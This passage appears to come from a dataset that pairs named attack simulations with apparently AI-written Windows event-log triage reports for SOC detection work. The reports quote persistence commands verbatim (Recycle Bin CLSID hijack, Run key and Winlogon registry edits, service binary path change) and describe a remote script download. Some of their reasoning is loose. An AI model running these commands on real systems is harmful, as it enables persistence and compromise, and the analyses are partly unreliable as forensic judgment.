   - A notable event, however, involves the use of the `cmd.exe` to modify a registry key with the command `reg ADD ""HKCR\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shell\open\command"" /ve /d ""calc.exe"" /f`. This command can be suspicious as it changes the default action for the Windows Recycle Bin (identified by its CLSID) to open the Calculator app. This indicates a potential compromise or a misconfiguration, typically used in persistence techniques by attackers to execute calc.exe when certain actions (like opening the Recycle Bin) are performed.

2. **Application Logs:**
   - The application logs show that the `edgeupdate` service stopped twice within a very brief period. This could be normal behavior during the update process or might signify a problem with the update service stability. However, it alone doesn’t raise strong concerns of malicious behavior.

3. **Unusual Registry Modification:**
   - The registry modification (as identified in point 1) represents a conceivable tactic that could be employed for a benign purpose (such as testing or scheduled tasks by an administrator), or possibly malicious under certain contexts.

### Conclusion:

- **Benign Activity:** The majority of the logs represent typical activities associated with Microsoft Edge updating itself on a Windows system under the control of the `SYSTEM` user context.
- **Suspicious Activity:** The registry modification via `cmd.exe` stands out as out-of-the-ordinary and potentially presents an exploitation risk or misuse. It’s a known technique to alter the behavior of OS components, making it critical to verify if this action was authorized and intentional.

### Resolution:
Based on the analysis, the overall resolution for these logs is **SUSPICIOUS**. Further investigation is warranted, particularly into the registry modification action:
- Verify if there is a legitimate task or organizational procedure that utilizes this specific registry modification.
- Conduct a deeper audit of recent user actions and scripts executed within the environment, especially those from the `SERVER002\admin_test` user context.

### Guidance:
- Engage with the system administrator or specific user handle associated with `admin_test` to verify authorized activities.
- Review change management logs or scripts that might have led to the registry alteration, ensuring it aligns with existing security policies.
- Consider enhanced monitoring of registry change events, particularly those involving commonly exploited keys or uncommon actions."
Domain Password Policy Check: No Number in Password,"### Analysis of Event Logs:

#### System Log:
- The logs primarily reflect updates being installed by Microsoft's Windows Update Client. The Event ID ""44"" indicates successful installation or reporting of an update's status, which is routine for a Windows environment.
- The updates listed (e.g., Microsoft.VCLibs.140.00, MicrosoftWindows.CrossDevice, Microsoft.NET.Native.Runtime.2.2) are standard components and libraries, used by applications running on Windows, particularly those in the Microsoft Store ecosystem.

#### Windows PowerShell Log:
- The PowerShell command log entries suggest the presence of a script or command used to manage user account passwords via Active Directory, specifically utilizing `Set-ADAccountPassword`. 
- While resetting passwords through PowerShell isn't inherently malicious, the script’s execution without explicit context could be suspicious, especially with the actions involving reading stored credentials and modifying password data files (`$credFile`).

#### Application Log:
- A single entry from ""Microsoft-Windows-Security-SPP"" suggests an action related to the Software Protection Platform Service. The details do not offer any explicit indicator of compromise or suspicious behavior.

#### Sysmon Log:
- The Sysmon logs show several processes, including PowerShell (`powershell.exe`), `conhost.exe`, `wevtutil.exe`, `taskhostw.exe`, and `whoami.exe`, running with either `SERVER002\admin_test` or `NT AUTHORITY\SYSTEM` accounts.
- Although these processes can be part of legitimate administrative tasks, the presence of repeated executions of PowerShell using a credential management script and commands like `whoami` and `HOSTNAME` might warrant further scrutiny. Often, such commands are used to enumerate user context or execute administrative scripts.

### Conclusion:

**Assessment:**  
There isn't definitive evidence of a compromise or explicit malicious activity from the logs provided. The PowerShell script execution and the pattern of process executions do raise questions regarding the intent and authorization of these actions, typically more suited for an IT administrator's work rather than routine operation.

**Resolution:**  
- **SUSPICIOUS:** The activities don't confirm overtly malicious behavior but do merit further investigation, particularly regarding the PowerShell script’s authorization and purpose. There’s a potential risk related to unauthorized access or credential handling, which must be clarified with the involved personnel.
  
**Guidance:**
- Verify with the system administrator if the PowerShell script is part of routine maintenance or an authorized task.
- Check if there were any reported issues or incidents requiring password resets or user management around the time of these logs.
- Monitor for any abnormal behavior or unauthorized access following the timeline of these logs.
- Consider running a more in-depth endpoint analysis or performing a managed scan for further assurance of system health."
Parent PID Spoofing - Spawn from New Process,"Upon analysis of the provided logs, the following observations were made:

1. **PowerShell Activity**: 
   - There is a PowerShell command logged executing `notepad.exe` and immediately invoking another PowerShell process with `Start-ATHProcessUnderSpecificParent`, which is a non-standard and suspicious behavior often associated with payload execution or bypassing standard security checks.
   - The command involves `-Command Start-Sleep 10`, which is not inherently malicious but combined with other obfuscation techniques or purposes could indicate suspicious behavior.

2. **Event Logs and Process Execution**:
   - Multiple `wevtutil.exe` and `conhost.exe` executions by the user account `admin_test`. While these are legitimate Windows binaries, excessive use, particularly in a scripted or automated manner, can sometimes be associated with log manipulation or other malicious activities.
   - The sequence of events does not show any immediate red flags such as known malicious signatures or privilege escalations directly, but the usage pattern again appears a bit suspicious when correlating the timestamps with PowerShell activity.

3. **Process Relationships**:
   - Sysmon entries show processes like `hostname.exe` and `whoami.exe` being executed by the `admin_test` account, which are legitimate but could be reconnaissance activities if combined with other suspicious activities.
   - There is a consistent pattern of process creation and termination involving key Windows binaries controlled under the `admin_test` account but the direct malicious intent wasn't found.

**Assessment**:
Although there were no explicit indicators of compromise, such as malware signatures or overt privilege escalation, the activity captured seems out of the ordinary and reflects a pattern that could indicate preparatory actions for further compromises or exploitation. 

**Resolution**: **SUSPICIOUS**

**Recommendations**:
1. **Further Investigation**:
   - Perform deeper analysis on the `admin_test` account: Identify its expected usage, roles, and historical behavior to see if the activity aligns with legitimate tasks.
   - Search for similar PowerShell commands across the network to ensure no other machines are affected or involved in a coordinated activity.

2. **Monitoring and Detection**:
   - Increase monitoring on PowerShell usage, especially commands similar to those logged here.
   - Set up alerts for unusual process creation activities involving binaries like `wevtutil.exe` and `notepad.exe` starting from PowerShell.

3. **Response Actions**:
   - Review the integrity of key systems and data to ensure no breach or tampering has occurred.
   - Conduct a wider threat hunt to rule out any undetected malicious presence.

4. **Security Measures**:
   - Consider implementing stricter controls and auditing on the use of administrative accounts.
   - Deploy application controls to restrict unauthorized PowerShell scripts or applications from running.

The described activity warrants close attention but does not conclusively prove malicious intent without further context or information, hence necessitating a cautious approach with more proactive investigation."
Winlogon Notify Key Logon Persistence - PowerShell,"After reviewing the provided Windows event logs, I have identified some activity that raises significant concerns:

### Windows PowerShell Logs Analysis:
The logs indicate the execution of a PowerShell script that modifies the Windows Registry, specifically in the ""HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\file"" key. The script sets properties such as DllName, Logon, Impersonate, and Asynchronous. These modifications are highly suspicious for several reasons:
- **HKCU Winlogon Notify Registry Key**: Modifying this registry key is often used for persistence mechanisms by malware, as it allows execution of the specified DLL during user logon.
- **DLL Executed Path**: The specified DLL path ""C:\Windows\Temp\fileNotificationPackage.dll"" is unusual as system-level DLLs are not typically stored in the Temp directory. This could potentially point to an attempt to execute an arbitrary DLL as part of a malicious payload.

### Sysmon Logs Analysis:
- **Process Execution**: There are multiple entries for the execution of processes like wevtutil.exe and conhost.exe by a user ""SERVER002\\admin_test"". While this type of activity can be benign, frequent execution of system utilities may suggest attempts to evade detection, modify system event logs (wevtutil.exe clears or alters logs), or manipulate console windows (conhost.exe).
- **Powershell.exe Execution**: The execution of PowerShell with similar command lines that manipulate registry entries as noted in the PowerShell logs is repeated here. The activity's persistence in both logs is indicative of potentially malicious behavior.

### Security and System Logs Analysis:
- **Time Change Events**: There are events indicating a time change by the process ""svchost.exe"". While the reason for this is not apparent, time alteration can be used by advanced adversaries to affect the integrity of timestamps and logs as part of their evasion techniques.

### Conclusion:
The execution of PowerShell scripts for registry modifications in a location known for user logon notifications, along with the potential persistence mechanism setup via DLL injection, is deeply suspicious. Additionally, the combination of these changes with the frequent usage of system utilities to potentially mask activities reinforces the likelihood of malicious intent.

### Resolution:
**MALICIOUS**

### Guidance:
Immediate action is required to investigate the source and intent of the PowerShell scripts and the origin of changes in the registry. Consider the following steps:
1. Quarantine the affected host (Server002) from the network to prevent further spread or data exfiltration.
2. Conduct a thorough scan using EDR tools for known indicators of compromise (IOCs), particularly as related to the DLL identified and PowerShell usage patterns.
3. Analyze User ""SERVER002\\admin_test"" login and activity logs for unauthorized access or command execution out of the ordinary times.
4. Review the Temp directory for unauthorized files and isolate any unknown or untrusted binaries or scripts.
5. Assess whether other hosts in the network display similar patterns of registry or filesystem modifications.

By taking these steps, you can work towards remediating the detected threat and ensuring the security posture of the network is restored."
Simulate - Post BEC persistence via user password reset followed by user added to company administrator role,"After analyzing the provided logs, a series of notable activities are evident, which warrant a closer examination due to their potential security implications:

1. **Unusual PowerShell Activity:**
   - A PowerShell script was executed that included modules for MSOnline and AzureAD, along with credential manipulation and role assignments such as ""Company Administrator"" and ""Global Reader."" The use of PowerShell for these actions is typical in administrative tasks but can also indicate malicious intent, especially if the accounts targeted (using placeholders like 'default') and actions (password resets and role assignments) are unauthorized.

2. **Repeated Execution of System Utilities:**
   - The logs indicate repeated execution of `wevtutil.exe` and `conhost.exe`. While `conhost.exe` is a legitimate system utility, repeated and rapid executions might suggest attempts at maintaining persistence or covering tracks.
   
3. **CompatTelRunner Activity:**
   - The logs show multiple events involving `CompatTelRunner.exe`, accessing various user accounts, and interacting with the system using elevated privileges. As a legitimate Windows telemetry service, it is unusual to see it triggering security audit events unless it’s being misused or tampered with.

4. **Elevated Privilege Usage:**
   - The security logs include events with elevated privileges (Event ID 4672), indicating actions performed with high-level permissions on what appears to be critical system processes. This might be part of normal administrative operations, but if not expected, could suggest privilege abuse.

5. **System Process Executions:**
   - System processes such as `svchost.exe`, `sppsvc.exe`, and `CompatTelRunner.exe` have been executed, with some parent processes unspecified. This could be part of routine system operations but combined with other indicators, might suggest something suspicious if those processes were manipulated or tampered with.

Based on the aforementioned points, the combination of unusual PowerShell activity, the involvement of multiple critical system processes, and administrative privileges used internationally requires further investigation. The legitimacy of the actions described (e.g., the PowerShell commands) and the authenticity of the administration tasks must be validated.

### Resolution:
- **SUSPICIOUS:** The activities detailed in the logs cannot be immediately deemed malicious, yet they present patterns that require comprehensive verification with internal processes and expectations. Further investigation is advised to determine the legitimacy of these activities, focusing on the PowerShell commands executed and the context around elevated privilege usage and system utility executions."
Modify Service to Run Arbitrary Binary (Powershell),"### Analysis of Logs:

#### **Suspicious Behavior:**

1. **PowerShell Logs:**
   - Execution of PowerShell script indicates stopping of the ""fax"" service, modifying its binary path to `notepad.exe`, and starting it again.
   - The command used: 
     ```
     powershell.exe & {Stop-Service -Name ""fax"" -force -erroraction silentlycontinue | Out-Null; set-servicebinarypath -name ""fax"" -path ""$env:windir\system32\notepad.exe""; start-service -Name ""fax"" -erroraction silentlycontinue | out-null}
     ```
   - This action is highly indicative of process replacement, a technique often associated with malware to hijack a legitimate service for elevation of privileges or maintaining persistence.

2. **Security Logs:**
   - No anomalous behavior detected here. The logs show standard system processes (`svchost.exe`) adjusting time, possibly corresponding with the PowerShell activity timestamp.

3. **Application Logs:**
   - Logs related to the Fax service are present, showing activity at the same time as the PowerShell command was executed. This could correlate with the service modification, indicating execution as planned in the PowerShell command.

4. **System Logs and Security Event ID 4616:**
   - No direct evidence of the system being compromised, although time adjustment logs might correspond to the activity time.

5. **Sysmon Logs:**
   - Subsequent activities involving PowerShell, processes by user `SERVER002\admin_test` is present.
   - Indicates potentially unauthorized use of administrative privileges to execute commands and adjust services.
   - Frequent execution of administrative utilities (e.g., `wevtutil.exe`) by the same user which might be part of benign administrative tasks but given the context require further investigation.

#### **Indicators of Malicious Activity:**

- The modification of a service binary path to `notepad.exe` is highly unconventional and a strong indicator of tampering, potentially for malicious purposes.
- Process replacement or service hijacking via PowerShell is a common tactic in various types of malware to conduct a stealthy execution of a malicious process.
- The privilege level of processes running under administrative user context executing such commands enhances risk.

### **Assessment:**

Based on the PowerShell command exhibited in the logs and corroborating evidence from other logs indicating service binary modification, the activities can be labeled as malicious. The technique used is consistent with known malicious behavior patterns.

### **Resolution: MALICIOUS**

### **Guidance and Next Steps:**

1. **Containment and Remediation:**
   - Immediately stop the affected Fax service and restore the original binary path to prevent any malicious activities.
   - Conduct a full system scan to detect any other modifications or malware present.
   - Review and reset credentials for any potentially compromised accounts, especially `SERVER002\admin_test`.

2. **Investigation:**
   - Perform a deeper forensic analysis to identify any further traces of intrusion or modifications in the system.
   - Analyze network logs for any unusual outbound traffic that may indicate data exfiltration.

3. **Long-term Measures:**
   - Implement stricter PowerShell execution policies and monitoring to detect similar activities in the future.
   - Enhance user training on the risks of running unauthorized scripts and processes on critical systems."
Import XML Schedule Task with Hidden Attribute,"**Analysis of the Logs:**

**Suspicious Behavior Identified:**

Upon analyzing the logs provided, we can observe a series of events in the Windows PowerShell and Sysmon logs that could potentially indicate malicious activity. Here's a breakdown of the key points:

1. **Windows PowerShell Logs:**
   - Multiple PowerShell events (EventID 600) indicate the starting and stopping of different providers with the execution of a PowerShell script using `Invoke-CimMethod`. The script attempts to register a scheduled task via XML:
     ```
     HostApplication=powershell.exe & {$xml = [System.IO.File]::ReadAllText(\""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.005\\src\\data_05_SCTASK_HIDDEN_ATTRIB.xml\"")
     Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace ""Root\\Microsoft\\Windows\\TaskScheduler"" -MethodName ""RegisterByXml"" -Arguments @{ Force = $true; Xml =$xml; }}
     ```
   - This behavior is unusual for standard administrative tasks, especially with tasks hidden and stored in temporary directories, which is often indicative of attempts to persist malicious code.

2. **Sysmon Logs:**
   - System Monitor (Sysmon) logs show frequent execution of `conhost.exe`, `wevtutil.exe`, and `wbem\\WmiPrvSE.exe` in conjunction with the `powershell.exe` process by the user `SERVER002\\admin_test`.
   - Execution of `wevtutil.exe` is noteworthy, as it is often used for clearing or managing Windows event logs, potentially indicating an attempt to cover tracks.

3. **User Context:**
   - All suspicious activity is associated with the `ADMIN_TEST` account, which may be a compromised administrative account or a malicious insider.

4. **Command Lines and File Paths:**
   - Usage of an undocumented or obfuscated file path (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.005\\src\\data_05_SCTASK_HIDDEN_ATTRIB.xml`) raises flags as part of defense evasion or persistence techniques.

**Assessment:**

Based on the above analysis, the observed activity appears **MALICIOUS** in nature due to:
- Execution of PowerShell scripts that modify scheduled tasks via XML, which is often seen in persistence mechanisms used by malware.
- Overuse of `conhost.exe` and associated executables without clear administrative necessity, potentially indicating script-based processes or remote execution.
- Presence of potentially malicious indicators such as hidden scheduled tasks being registered, indicating techniques to maintain access.

**Guidance on How to Proceed:**

1. **Immediate Action:**
   - Disable the `ADMIN_TEST` user account temporarily to evaluate if this stops the unusual behavior.
   - Investigate and consider isolating the affected server (`Server002`) to prevent potential spread of malicious activity.

2. **Forensic Investigation:**
   - Conduct a deeper forensic analysis using snapshot tools or memory analysis to detect any loaded malicious modules.
   - Review all scheduled tasks, especially those hidden or associated with unusual file paths or scripts.

3. **Logs and Monitoring:**
   - Enable more enhanced logging for PowerShell (e.g., module logging, script block logging) to capture detailed script activity.
   - Implement tighter Sysmon configuration to flag unusual process creations and command line arguments.

4. **Threat Remediation:**
   - Update and validate antivirus or Endpoint Detection and Response (EDR) solutions to scan the server comprehensively.
   - Review network traffic logs for any outgoing or incoming anomalies that coincide with the time of suspicious behavior. 

The indicated actions aim to mitigate threats, identify potential infections, and enhance the organization's security posture against similar attacks in the future."
Shortcut Modification,"Upon reviewing the provided Windows event logs, I have conducted a detailed analysis of the entries to identify any suspicious or anomalous activities that may indicate malicious intent or compromise. Here's the breakdown:

### Analysis

#### Security Logs
- **EventID 4616**: This log indicates a system time change, which is legitimate by the `svchost.exe` process running under the `NT AUTHORITY\LOCAL SERVICE`. While time adjustments can sometimes be indicative of a scripted or malicious action (e.g. to cover tracks), in this context, there is no clear evidence suggesting malicious intent, especially since it involves a legitimate service.

#### Application Logs
- **edgeupdate** service logs suggest the stoppage of an update service which is a routine operation especially if updates are being applied to an application like Microsoft Edge.

#### Sysmon Logs
- **Process Creation & File Creation Events**: 
  - Legitimate system binaries such as `hostname.exe`, `conhost.exe`, `whoami.exe`, and others executed by the user `SERVER002\admin_test` with a High Integrity Level. These are standard Windows processes.
  - Notably, `cmd.exe` executes a chain that involves creating a URL shortcut pointing to `calc.exe`, which is executed via the shortcut. While this behavior could typically suggest malicious script execution patterns, `calc.exe` is a benign application, implying no immediate harm. However, creation of such shortcuts can sometimes suggest attempts at executing scripts or opening backdoors in real-world scenarios.

- **Edge Update Processes**: Multiple entries of `MicrosoftEdgeUpdate.exe` and related components. These are associated with Microsoft Edge updating itself and appear benign.

#### System Logs
- **Kernel-General EventID 1**: This indicates normal time changes performed by the system's time service (`time.windows.com`), which corroborates with entries in the security log. It further supports the absence of malicious activity behind these system changes.

### Conclusion
Based on the evidence in the logs:
- **Normal Binaries Run**: `hostname`, `whoami`, and others are expected activities.
- **Time Adjustments & Microsoft Edge Updates**: Both are legitimate activities with no indicators of compromise.
- **Suspicious Pattern**: The execution pattern using `cmd.exe` to create a shortcut linked to `calc.exe` is non-standard, but not harmful with `calc.exe`. This pattern could resemble attempts seen in malicious scripts but can't be immediately classified without more context.

### Resolution
- **SUSPICIOUS**: The activity involving `cmd.exe` creating shortcuts targeting `calc.exe` does not directly indicate compromise, but because it mimics patterns that can be used in malicious operations, further investigation into the origin and intent of these actions is recommended."
`SeDebugPrivilege` token duplication,"After conducting a comprehensive analysis of the logs provided, the following observations and interpretations were made:

### Observations:

1. **Sysmon Logs:**
   - Repeated execution of legitimate Windows binaries such as `whoami.exe`, `conhost.exe`, `wevtutil.exe`, and `hostname.exe` by the user `SERVER002\admin_test`.
   - A noteworthy event involved `powershell.exe` executed with a command that downloads and executes a script from the internet using `Invoke-WebRequest (IWR)`. The source of this script is related to privilege escalation, specifically retrieving it from the `BC-SECURITY/Empire` GitHub repository.

2. **Security Logs:**
   - Time manipulation events indicated by `EventID 4616`, which might suggest an attempt to cover tracks or conduct actions at particular times.

3. **Application Logs:**
   - Windows Defender is shown as active, meaning it might be actively scanning for threats.

4. **Windows PowerShell Logs:**
   - The PowerShell events show the execution of a script that was fetched from an external source, aligning with potential malicious activities given the nature of the script, which is known for privilege escalation.

5. **System Logs:**
   - Kernel and Time Service events show system time changes, reinforcing the likelihood of an attempt to obscure event timing or system actions.

### Suspicious or Anomalous Behavior:

- **PowerShell Activity:** The use of PowerShell to fetch and execute a script from the internet, especially from a known security testing framework (Empire), stands out as a strong indicator of potentially malicious behavior. The command reflects typical patterns seen in exploitative or reconnaissance operations.
  
- **Time Changes:** The manipulation of system time through the Windows Time Service (via `svchost.exe`) is another red flag that might indicate an attempt to manipulate logs or schedules for malicious activities.

### Conclusion:

Based on the detailed review and the presence of a suspicious PowerShell command executing a remote script indicative of potential privilege escalation attempts, the activities observed in the logs appear to be **SUSPICIOUS**. The behavior might not be conclusively malicious without further context, such as the environment's baseline activities or intentions, but warrants further investigation.

### Guidance on How to Proceed:

1. **Immediate Action:**
   - Isolate the affected host (Server002) to prevent any potential lateral movement or further exploitation.
   - Conduct a detailed endpoint forensics analysis focusing on memory dumps, running processes, and any footprints left by the execution of the retrieved PowerShell script.

2. **Monitor and Analyze:**
   - Continuously monitor any PowerShell and network activities from this host.
   - Review user activity logs and correlate them with known legitimate tasks to seek anomalies.

3. **Investigate and Remediate:**
   - Investigate the user account `SERVER002\admin_test` for unauthorized access.
   - Reset the system time to the correct settings and ensure that such alterations are logged and notified if they occur again.

In conclusion, the evidence suggests the need for in-depth analysis to validate and address potential security vulnerabilities actively being exploited or prepared for exploitation."
Process Hollowing in Go using CreateProcessW WinAPI,"Based on the analysis of the provided Windows event logs across different categories (System, Sysmon, Windows PowerShell, Application, and Security logs), here's a detailed evaluation for any indicators of malicious activity or anomalies:

### 1. Time Change Events:
- **System Event ID 1 & 24**: The system time on Server002 was changed. The logs show that this change occurred twice within a very short timestamp (less than a second between new and old time values). This is logged under `svchost.exe` which can be a legitimate system activity but could suggest tampering if unexplained.

### 2. Sysmon Events:
- **Event ID 5 (Process Terminated)**: 
  - Multiple instances of `wevtutil.exe` and `conhost.exe` being executed by `SERVER002\admin_test`. While `wevtutil.exe` is usually used for event log management, its unusual frequent invocation should be noted.
  - A noteworthy entry: execution of `powershell.exe` with a command line that involves a temporary directory executable `CreateProcess.exe` targeting `werfault.exe`. This is unusual and suggests scripting activity possibly aiming at debugging/crash handling capabilities, which could be used for malicious purposes.

- **Process Creation Events**:
  - **PowerShell Execution**: PowerShell was executed with a suspicious command-line (`CreateProcess.exe -program ""C:\\Windows\\System32\\werfault.exe"" -debug`). The use of PowerShell for executing binaries from temporary directories is suspicious and is frequently used in attacks.
  - **Elevation of Privileges (Event ID 4672)**: Logs show `admin_test` was granted a set of high privileges which include `SeDebugPrivilege`. While this could be legitimate for administrative tasks, combined with the PowerShell activity, it presents risk.

### 3. Security Log Events:
- **Event ID 4624 (Logon Events)**: Indicates successful logons. The presence of NTLM authentication could be a concern depending on the network environment but is not inherently malicious alone.

### 4. Windows PowerShell Events:
- PowerShell logs indicate execution context aimed to interact with the environment utilizing scripts or commands. Given the context of other log entries involving PowerShell, further examination is necessary.

### Conclusion & Resolution:
The evidence gathered from the logs points towards potentially suspicious activities involving PowerShell and system time manipulation through `svchost.exe`. However, without additional context or correlating indicators, it's challenging to conclusively mark this as malicious. Still, the behavior is anomalous and warrants further investigation to rule out any unauthorized access or exploitation attempts.

**Resolution**: **SUSPICIOUS**

### Way Forward:
- Conduct deeper investigation into the activities around `admin_test`, including reviewing user access patterns and verifying if actions were authorized.
- Investigate the origin and purpose of the `CreateProcess.exe` script found in the temporary directory as invoked by PowerShell.
- Review additional network logs and system configuration changes around the timestamps to identify any alignment with known malicious behaviors.
- Consider implementing stricter monitoring and audit logging for PowerShell activities, especially scripts executed from user directories and temporary paths.
- Perform a vulnerability assessment to ensure that systems are not susceptible to time synchronization exploits or privilege escalation vulnerabilities."
Winlogon HKLM Shell Key Persistence - PowerShell,"In the collection of logs provided, there are a few noteworthy observations:

1. **PowerShell Activity**: The PowerShell log shows events where the PowerShell command executed a command to modify the registry key related to the Windows shell (`Winlogon\\Shell`). The command includes setting `explorer.exe, C:\\Windows\\System32\\cmd.exe` as the shell. Modifying this registry key to include a secondary application (like `cmd.exe`) is commonly associated with persistence mechanisms employed by malware.

2. **Sysmon Logs**: The Sysmon logs indicate instances of various processes such as `wevtutil.exe`, `conhost.exe`, and `powershell.exe` executed by the user `SERVER002\\admin_test`. Notably, there's the execution of `whoami.exe` and `hostname.exe` that suggests the user might be performing reconnaissance activities typically seen in a compromised host.

3. **Application of `wevtutil.exe`**: Multiple instances of `wevtutil.exe` are recorded. `wevtutil.exe` is a command-line utility for managing event logs, and its presence could be part of normal administrative activity. Still, it can also be used for malicious purposes such as clearing logs to conceal activity.

4. **Execution Context**: Events occurred under the context of `SERVER002\\admin_test`. The actions taken are elevated as indicated by the integrity level. While some of these actions can occur under legitimate administrative scenarios, their presence, combined with the registry modification, raises suspicion.

5. **Indicators of Persistence**: The technique of appending a command like `cmd.exe` to the registry key for the shell can be an indicator of malware attempting to persist on the system by ensuring that a command prompt is opened on user login.

### Assessment:

- **Suspicious Activity**: The primary area of concern here is the PowerShell usage to alter settings for persistence, coupled with command-line reconnaissance utilities. The modification of the shell can indicate an attempt to maintain access to the system or to facilitate further compromises.

### Resolution: **SUSPICIOUS**

The activity observed suggests the possibility of a compromise or an unauthorized user attempting to establish persistence and perform reconnaissance on the system. While it might not be directly harmful or malicious without further context (such as who executed these commands and whether this was authorized), it merits a thorough investigation to determine its legitimacy.

### Guidance:
- **Further Investigation**: Validate with the relevant team whether the PowerShell commands and process creations were initiated by an authorized admin. If not, consider these changes as indicators of compromise (IOC).
- **Review User Activity**: Investigate the user `SERVER002\\admin_test` activity logs, permissions, and any anomalies in their activities.
- **Formalize Incident Response**: Depending on findings, escalate this for further action and potentially initiate incident response procedures.
- **Mitigate Persistence**: If unauthorized, revert registry changes, and clean up any persistence mechanisms. Regularly audit security logs to identify recurring patterns.
- **Security Monitoring**: Enhance security monitoring measures to trigger alerts against such registry changes and suspicious PowerShell commands in the future."
Reg Key Run,"Upon analyzing the provided Windows event logs from various channels including System, Application, Security, and Sysmon logs, here are my findings:

1. **System Log Analysis**:
   - The logs show a series of time change events performed by `svchost.exe` with `LOCAL SERVICE` as the user. These are usually benign, related to system adjustments for time synchronization and appear to be using the standard Windows time service (time.windows.com). No suspicious activities seeming outwardly malicious were noted here.

2. **Application Log Analysis**:
   - A log entry related to the Software Protection Platform Service was noted but it shows expected benign behavior, associated with normal Windows licensing checks.

3. **Security Log Analysis**:
   - Security audit event ID 4616 indicates system time changes performed under the `LOCAL SERVICE` account. There is no directly suspicious behavior as it corroborates with the actions seen in the System logs.

4. **Sysmon Log Analysis**:
   - There are several executions of `wevtutil.exe`, `conhost.exe`, and `HOSTNAME.EXE`, which typically are expected in normal operations, especially during logging or system-related tasks.
   - The execution of commands like `whoami.exe` and `reg.exe` could be part of normal admin activity, but the exact context raises some concerns. In particular, the command line involving `reg.exe`:
     ```batch
     ""cmd.exe"" /c REG ADD ""HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" /V ""file file"" /t REG_SZ /F /D ""C:\Path\file.exe""
     ```
     This modification to the `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` registry path suggests persistence techniques often used in attacks. The `\Run` key is commonly used to auto-start programs on user logon.

5. **Potential Indicators of Compromise**:
   - The execution of the above registry command is notably concerning since it implies persistence, which could be a tactic used by malware to maintain a foothold on the system.
   - Although `HOSTNAME.EXE`, `whoami.exe`, etc., might be regular diagnostics, they can also be part of an enumeration or exploratory process by an attacker.

**Assessment**:
The observation of registry key modifications for persistence, particularly with non-descriptive entry (`""file file""`), increases the suspicion on malicious activity. While other elements show standard system operations, the registry modification event needs more investigation.

**Resolution**: **SUSPICIOUS**

**Guidance**:
- Conduct a thorough check on the purpose and origin of the executable `file.exe`, analyze its hash against known malware databases, and review its activity.
- Identify if the creation of the registry entry aligns with authorized changes, and verify the user `SERVER002\admin_test` for any unusual access patterns or compromised credentials.
- Ensure that the system's antivirus or endpoint monitoring solutions are up-to-date and carry out a full scan to detect and mitigate any potential threats.
- Monitor for further suspicious registry modifications or unauthorized command executions in real-time to prevent further compromise."
HKLM - re-execute Internet Explorer Core Fonts' StubPath payload by decreasing version number,"Upon reviewing the provided Windows event logs, here is a detailed analysis focusing on identifying any suspicious or malicious activities:

1. **Sysmon Logs**:
   - Repeated execution of `wevtutil.exe` and `conhost.exe` by the same user (`SERVER002\\admin_test`):
     - Processes `wevtutil.exe` and `conhost.exe` executed multiple times in rapid succession, this could indicate a script or automated task. `wevtutil.exe` is a legitimate tool used for manipulating event logs, often used by attackers to clear traces of their activity or to query logs. However, without further context or accompanying suspicious activities, it remains SUSPICIOUS.
     - The processes are running under an admin user context, which could potentially indicate an attempt to escalate privileges or cover tracks.
   
2. **Notable PowerShell Activity**:
   - Execution of a PowerShell script with commands to set registry properties:
     - `powershell.exe` used to modify registry settings via `Set-ItemProperty`, and the execution of `runonce.exe` with `/AlternateShellStartup` could indicate persistence mechanisms or alterations to startup behavior. Such activities are common in malicious scripts trying to maintain persistence on a compromised system or execute payloads during system boot.
     - The command modifies the registry key related to Active Setup, which is often targeted for persistence.
     - This is highly SUSPICIOUS and leans towards MALICIOUS without further context or purpose for the registry alteration.

3. **Windows Security Logs**:
   - No direct indicators of malicious activity. However, observed changes in system time (`EventID 4616`) which might suggest a potential attempt to manipulate time-based security mechanisms or logs. 

4. **Application Logs**:
   - Regular events recorded for services, such as `edgeupdate`, showing service stops. Although normal for updates, without context of an update event, repeated stopping can indicate tampering with update mechanisms or service configurations. 

5. **System Logs**:
   - Records of time adjustment, aligning with the observed time change in the Security logs, which may suggest attempts to hide activities or generate inconsistencies in log timelines.

### Assessment and Resolution:
- The combination of registry editing via PowerShell, the execution of multiple system utilities in rapid succession, particularly by an admin user, and the alteration of system time points toward potential malicious intent or probing for vulnerability exploitation.

**Resolution: SUSPICIOUS**

### Guidance:
1. **Immediate Actions**:
   - Investigate the purpose of the PowerShell script and registry modifications.
   - Verify the legitimacy of the `admin_test` user's activities or if the account has been compromised.
   - Monitor and potentially disable any suspicious startup items or persistent scripts.
   
2. **Further Investigation**:
   - Examine related network traffic for outbound connections that might signal data exfiltration.
   - Review historical logs for patterns that align with observed activities.
   - Assess for other systems that may have similar activities as part of a coordinated attempt.

3. **Remediation**:
   - If found malicious, proceed with isolating the host, changing compromised credentials, and applying security patches.
   - Consider employing enhanced monitoring using security solutions with behavioral analysis capabilities to better detect such activities in the future."
Authentication Package,"Based on the detailed log entries provided, I've conducted an in-depth analysis to identify any potential indicators of malicious activity. Here's a summary of the findings:

### Analysis:

1. **Time Manipulation Observed:**
   - **Security Log (EventID: 4616)** and **System Log (EventID: 1)** show time discrepancies where the **NewTime** is earlier than the **OldTime**. This suggests that the system time was altered.
   - Time modifications can sometimes be used by attackers to cover tracks or interfere with time-based security measures.

2. **Suspicious PowerShell Activity:**
   - Multiple **Sysmon logs (EventID: 1)** indicate that a PowerShell script was executed with a command line that includes `Copy-Item` to a system directory and `reg add` to modify the registry key `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa`.
   - This activity is suspicious as it attempts to add a non-standard DLL (`package.dll`) to the authentication packages in the registry, which is often indicative of a persistence mechanism used by malware.

3. **Privilege Escalation and Potential Unauthorized Access:**
   - **Security Log (EventID: 4672)** indicates privileges such as `SeDebugPrivilege` and others are assigned to the account `admin_test`. This indicates privilege escalation, which is a common tactic used by attackers.
   - The presence of `LogonType: 3` in **Security Log (EventID: 4624)** indicates a network logon session, which could be less suspicious but can raise a red flag when combined with privilege escalation.

4. **Executable Activity:**
   - Various instances of **conhost.exe** and **wevtutil.exe** executions, as noted in the **Sysmon logs (EventID: 1 and 5)**, are also seen. While **conhost.exe** can be used legitimately by the system, repeated or unusual launches could indicate an effort to hide command-line operations.
   - The command-line arguments associated are typical, but frequent use with elevated privileges and in sequence may be cause for concern if not standard practice.

5. **Processes Running under SYSTEM Integrity:**
